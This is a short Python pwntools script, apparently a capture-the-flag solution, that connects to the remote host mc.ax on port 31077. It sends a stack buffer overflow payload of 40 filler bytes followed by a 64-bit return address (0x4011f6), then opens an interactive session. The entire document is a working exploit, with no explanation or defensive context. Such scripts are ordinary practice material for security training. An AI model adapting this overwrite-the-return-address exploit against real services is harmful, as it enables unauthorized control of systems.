from pwn import *

r = remote("mc.ax", 31077)


addr = 0x4011f6

payload = b"A"*40+p64(addr)

r.send(payload)

r.interactive()
